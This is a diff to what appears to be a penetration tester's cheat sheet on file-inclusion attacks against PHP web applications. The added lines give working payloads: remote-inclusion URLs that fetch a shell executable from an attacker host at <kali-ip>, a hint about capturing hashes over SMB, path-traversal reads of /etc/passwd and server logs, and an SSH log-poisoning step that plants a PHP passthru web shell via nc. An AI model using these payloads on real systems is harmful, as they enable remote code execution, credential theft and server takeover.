@@ -1,14 +1,19 @@
 #### Identifying
 ```
-
+c:\Windows\System32\Drivers\etc\hosts
+/etc/passwd
 ```
 
+#### Validating
+```
+
+```
 #### Exploiting
 ##### RFI
 ```
 #Check whether you can request a file from a remote server.
 1. http://example.com/file.php?file=http://<kali-ip>/myshell.exe
-2. http://example.com/file.php?file=//<kali-ip>/kali/myshell.exe
+2. Windows: http://example.com/file.php?file=//<kali-ip>/kali/myshell.exe --> If doesn't execute can you capture the hash?
 ```
 ##### LFI
 ```
@@ -20,7 +25,14 @@
 	#Apache
 	1. Windows: http://example.com/file.php?file=/../../../xampp/apache2/logs/access.log | /../../../xampp/apache/logs/access.log
 	2. Linux: http://example.com/file.php?file=/../../../var/log/apache2/access.log | /../../../var/log/apache/access.log
-	3. 
+	#Pois
+
+	#SSH
+	#Check is it logging SSH connections?
+	1. http://example.com/file.php?file=/../../../var/log/auth.log
+	#Poison log
+	1. nc -nv <ip> 22
+	2. Payload: Thisislogpoisoning/<?php passthru($_GET['cmd']); ?>
 ```
 ##### PT
 ```
